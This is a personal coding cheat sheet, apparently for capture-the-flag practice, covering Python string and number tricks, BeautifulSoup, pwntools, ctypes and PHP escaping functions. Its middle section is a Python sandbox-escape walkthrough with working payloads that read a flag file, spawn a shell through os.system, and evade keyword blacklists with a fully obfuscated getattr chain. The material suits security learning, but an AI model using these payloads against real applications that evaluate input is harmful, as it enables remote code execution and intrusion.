***********************
Coding Quick Reference
***********************

Python
======

Use python

* [::-1] means 

  Assumming a is a string. The Slice notation in python has the syntax -

 ::

  list[<start>:<stop>:<step>]

 So, when you do a[::-1] , it starts from the end, towards the first, taking each element. So it reverses a. This is applicable for lists/tuples as well.

 Example:

 ::

  >>> a = '1232'
  >>> a[::-1]
  '2321'

* binascii.unhexlify(hexstr) to convert hex to string
* base64.decodestring(str) to decode base64 string
* Convert number to hex

 :: 
    
     hex(15)
     '0xf'

* Convert hex to decimal

 ::

  s = "6a48f82d8e828ce82b82"
  i = int(s, 16)

* Extract numbers from a string: Use a regexp :

 ::

  >>> import re
  >>> re.findall(r'\d+', 'hello 42 I\'m a 32 string 30')
  ['42', '32', '30']

 This would also match 42 from bla42bla. If you only want numbers delimited by word boundaries (space, period, comma), you can use \b :

 ::

  >>> re.findall(r'\b\d+\b', 'he33llo 42 I\'m a 32 string 30')
  ['42', '32', '30']

* Extract string inside single quotes using python script

 Use re.findall:

 ::

  >>> import re
  >>> strs = """text:u'MUC-EC-099_SC-Memory-01_TC-25'
               text:u'MUC-EC-099_SC-Memory-01_TC-26'
            text:u'MUC-EC-099_SC-Memory-01_TC-27'"""

  >>> re.findall(r"'(.*?)'", strs, re.DOTALL)
  ['MUC-EC-099_SC-Memory-01_TC-25',
   'MUC-EC-099_SC-Memory-01_TC-26',
   'MUC-EC-099_SC-Memory-01_TC-27'
  ]

* ASCII value of a character in Python

 function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.

 ::

  >>> ord('a')
  97

* Solving Algebraic equations using python: Use sympy
  Use solve() to solve algebraic equations. We suppose all equations are equaled to 0, so solving x**2 == 1 translates into the following code:

 ::

  >>> from sympy.solvers import solve
  >>> from sympy import Symbol
  >>> x = Symbol('x')
  >>> solve(x**2 - 1, x)
  [-1, 1]

  
 The first argument for solve() is an equation (equaled to zero) and the second argument is the symbol that we want to solve the equation for.

* AVL Tree Implementation in Python : `python-avl-tree <https://github.com/pgrafov/python-avl-tree>`_

* Convert all strings in a list to int
  So if we have:

 ::

  results = ['1', '2', '3']

 How do I make it:

 ::

  results = [1, 2, 3]

 
  Use the map function(in py2):
 
 ::
 
  results = map(int, results)
 
 In py3:

 ::

  results = list(map(int, results))

* Read the RGB value of a given pixel in Python?

 ::

  from PIL import Image
  im = Image.open("dead_parrot.jpg") #Can be many different formats.
  pix = im.load()
  print im.size #Get the width and hight of the image for iterating over
  print pix[x,y] #Get the RGBA Value of the a pixel of an image
  pix[x,y] = value # Set the RGBA Value of the image (tuple)
  im.save("alive_parrot.png") # Save the modified pixels as png

* Convert Text to Binary and back?
  
  ::

    >>> import binascii
    >>> bin(int(binascii.hexlify('hello'), 16))
    '0b110100001100101011011000110110001101111'

 In reverse:

 ::

    >>> n = int('0b110100001100101011011000110110001101111', 2)
    >>> binascii.unhexlify('%x' % n)
    'hello'

* function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.

 ::

    >>> ord('a')
    97
    >>> chr(97)
    'a'
    >>> chr(ord('a') + 3)
    'd'


* String formating of numbers in python (Print 0000 - 9999)

 ::

  >>> for i in xrange(10):
  ...     '{0:04}'.format(i)
  ... 
  '0000'
  '0001'

* Insert a newline character every 64 characters using Python

 ::

  s = "0123456789"*100 # test string
  import re
  print re.sub("(.{64})", "\\1\n", s, 0, re.DOTALL)

* Having a function where you can provide parameter in online webform? Like there is a function definition like def fun() where we can pass two arguments, that are interpreted.

  ::

   def fun(User_Input): 

       c = a + b
           return c


 Try

 ::

  1.   a,b=dir()[0]
  2.   a,b=print("Hello")
  3.   a,b=print(exec("import os"),eval("os.listdir('.')"))

  Cat a file?

  1.   a, b, c = __import__('os').system('cat FLAG')
  2.   a,b=print(open("FLAG", "r").read())

 The above should work fine till there are no blacklist wordlist provided.

 Let's craft a payload to bypass the blacklist.

 Create a string class (also works with list or dict)

 ::

  >>> ''.__class__
  <class 'str'>
 
 Now we need the parent class, there is two ways:
 
 ::

  >>> ''.__class__.__base__
  <class 'object'>
  >>> ''.__class__.__mro__
  (<class 'str'>, <class 'object'>)
  >>> ''.__class__.__mro__[1]
  <class 'object'>

 Now we have the object class. So we can access to all the child classes:

 ::

   >>> ''.__class__.__base__.__subclasses__()
   [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'moduledef'>, <class 'module'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class 'zipimport.zipimporter'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'rlcompleter.Completer'>]
 
 Let's find a more suitable way to access the subclasses by index:

 ::

  >>> for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
  ...   print(i,': ',val)

 Using __init__ to initialize the class and __globals__ to access the global namespace of the module in which the function was defined.

 `pyjail WU <https://github.com/kimtruth/GoN-Write-up>`_ was able to call `sys` from `codecs.StreamReaderWriter` class.

 ::

  ''.__class__.__mro__[1].__subclasses__()[104]
  <class 'codecs.StreamReaderWriter'>`

 So from this namespace we are able to call sys.
 
 ::

  >>> ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"]
  <module 'sys' (built-in)>
 
 Then it's easy to import os:
 
 ::

  >>> ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"]
  <module 'os' from '/usr/lib/python3.7/os.py'>

 And finally using system method to launch a system command and read the flag:
 
 ::

  ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("cat FLAG")


 However if "." and "__" are also blacklisted then we can use

 * Without . to call method, we can use getattr instead
 * Without __import__, we can use catch_warnings in {}.__class__.__base__.__subclasses__()

 ::

  {}.__class__.__base__.__subclasses__()[[i.__name__ == "catch_warnings" for i in {}.__class__.__base__.__subclasses__()].index(True)] this will give me catch_warnings
  {}.__class__.__base__.__subclasses__()[[i.__name__ == "catch_warnings" for i in {}.__class__.__base__.__subclasses__()].index(True)]()._module.__builtins__["__import__"]("os").system("sh") this will give me shell
 
 Then we just need to change . to getattr, and _ to dir(0)[0][0]
 Final payload :

 ::

  getattr(getattr(getattr(getattr(getattr(getattr((), dir(0)[0][0]*2+"class"+dir(0)[0][0]*2), dir(0)[0][0]*2+"base"+dir(0)[0][0]*2), dir(0)[0][0]*2+"subcl"+"asses"+dir(0)[0][0]*2)()[getattr([getattr(i, dir(0)[0][0]*2+"name"+dir(0)[0][0]*2) == "catch"+dir(0)[0][0]+"warnings" for i in getattr(getattr(getattr((), dir(0)[0][0]*2+"class"+dir(0)[0][0]*2), dir(0)[0][0]*2+"base"+dir(0)[0][0]*2), dir(0)[0][0]*2+"subcl"+"asses"+dir(0)[0][0]*2)()], "index")(True)](), dir(0)[0][0]+"module"), dir(0)[0][0]*2+"builtins"+dir(0)[0][0]*2)[dir(0)[0][0]*2+"imp"+"ort"+dir(0)[0][0]*2]("o"+"s"), "sy"+"stem")("sh")

BeautifulSoup
-------------


A tag may have any number of attributes. The tag <b id="boldest"> has an attribute “id” whose value is “boldest”. You can access a tag’s attributes by treating the tag like a dictionary:

tag['id']
# u'boldest'

You can access that dictionary directly as .attrs:

tag.attrs
# {u'id': 'boldest'}


and read the tag value using

print(tag.get('id'))

If you have something like

::

 <form id="form_product_page" name="form_1362737440" action="/download/791055/164084/" method="get">
 <input id="nojssubmit" type="submit" value="Download" />
 </form>

and want action value we can

::

 action = soup.find('form', id='form_product_page').get('action')


PwnTools
--------

Importing

::

 >>> from pwn import *

Making Connections

::

 conn = remote('ftp.ubuntu.com',21)

Receiving Lines

::

 conn.recvline() 
 conn.recvuntil(' ', drop=True)

Sending Lines

::

 conn.send('USER anonymous\r\n')
 conn.sendline('Hello')

Pwn Templates
^^^^^^^^^^^^^

`pwn template <https://github.com/Gallopsled/pwntools/pull/909>`_ command can be used for generating templates. 


ctypes 
------

A foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python. ctypes exports the cdll, and on Windows windll and oledll objects, for loading dynamic link libraries.

PHP
===

* mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection.
* filter_var — Filters a variable with a specified filter. There are multiple types of `filter <http://php.net/manual/en/filter.filters.php>`_ such as Validate, Sanitize etc.

BurpSuite
=========

(1) In a new tab, type or paste about:config in the address bar and press Enter/Return. Click the button promising to be careful.

(2) In the search box above the list, type or paste captiv and pause while the list is filtered

(3) Double-click the network.captive-portal-service.enabled preference to switch the value from true to false
If you are in a managed environment using an autoconfig file, for example, you could use this to switch the default: 
user_pref("network.captive-portal-service.enabled", false);

